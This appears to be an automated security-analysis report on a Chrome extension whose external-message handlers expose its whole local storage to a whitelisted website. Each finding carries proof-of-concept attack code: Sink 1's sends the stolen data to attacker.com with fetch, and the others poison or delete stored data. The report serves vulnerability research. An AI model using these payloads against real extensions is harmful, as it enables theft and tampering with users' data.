# CoCo Analysis: khdhjahfepopfkhemiimfoebgjikhcce

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4

---

## Sink 1: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/khdhjahfepopfkhemiimfoebgjikhcce/opgen_generated_files/bg.js
Line 751-752: CoCo framework code (storage_local_get_source mock)
Line 980-985: Actual vulnerable code

**Code:**

```javascript
// Background script (bg.js Line 974-1016)
chrome.runtime.onMessageExternal.addListener(function (request, sender, sendResponse) {
  console.log(request, sender);

  if (request.message == "load") {
    fromStorage().then((results) => {
      console.log(results);
      sendResponse({ results: results });  // ← SINK: Sends all storage to external caller
    });
    return true;
  }
  // ... other handlers
});

async function fromStorage() {
  return new Promise((resolve, reject) => {
    chrome.storage.local.get(null, (items) => {  // ← SOURCE: Gets ALL storage data
      if (chrome.runtime.lastError) {
        reject(chrome.runtime.lastError);
      } else {
        resolve(items);  // ← Returns entire storage contents
      }
    });
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted website (https://www.destinationtab.com/*)

**Attack:**

```javascript
// Attacker on https://www.destinationtab.com (or compromises that domain)
chrome.runtime.sendMessage(
  "EXTENSION_ID",
  { message: "load" },
  function(response) {
    console.log("Stolen storage data:", response.results);
    // Send to attacker's server
    fetch("https://attacker.com/exfil", {
      method: "POST",
      body: JSON.stringify(response.results)
    });
  }
);
```

**Impact:** Complete information disclosure vulnerability. An attacker from the whitelisted domain (or anyone who compromises that domain) can retrieve ALL data stored by the extension in chrome.storage.local via the sendResponse callback. This includes user preferences, settings, and any sensitive data the extension stores.

---

## Sink 2 & 3: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink & chrome_storage_local_remove_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/khdhjahfepopfkhemiimfoebgjikhcce/opgen_generated_files/bg.js
Line 988: `chrome.storage.local.set(request.value, function () {...})`
Line 998: `chrome.storage.local.remove(request.value, function () {...})`

**Code:**

```javascript
// Background script (bg.js Line 974-1007)
chrome.runtime.onMessageExternal.addListener(function (request, sender, sendResponse) {

  if (request.message == "save") {
    chrome.storage.local.set(request.value, function () {  // ← SINK: Saves attacker data
      if (chrome.runtime.lastError) {
        console.error(chrome.runtime.lastError);
      } else {
        sendResponse({ message: "saved" });
      }
    });
    return true;
  }

  if (request.message == "remove") {
    chrome.storage.local.remove(request.value, function () {  // ← SINK: Removes data
      if (chrome.runtime.lastError) {
        console.error(chrome.runtime.lastError);
      } else {
        sendResponse({ message: "removed" });
      }
    });
    return true;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted website

**Attack:**

```javascript
// Attacker on https://www.destinationtab.com
// Poison storage with malicious data
chrome.runtime.sendMessage(
  "EXTENSION_ID",
  {
    message: "save",
    value: {
      maliciousKey: "maliciousValue",
      apiEndpoint: "https://attacker.com/api"
    }
  },
  function(response) {
    console.log("Storage poisoned:", response);
  }
);

// Or delete critical data
chrome.runtime.sendMessage(
  "EXTENSION_ID",
  {
    message: "remove",
    value: ["userPreferences", "settings"]
  },
  function(response) {
    console.log("Data deleted:", response);
  }
);
```

**Impact:** Complete storage exploitation chain. An attacker can:
1. **Read**: Retrieve all storage data (Sink 1)
2. **Write**: Poison storage with arbitrary attacker-controlled data (Sink 2)
3. **Delete**: Remove any stored data (Sink 3)

This enables persistent attacks where the attacker can modify extension behavior by changing stored configuration, steal user data, and cause denial of service by deleting critical data. Combined with Sink 1, the attacker has complete control over the extension's storage layer.
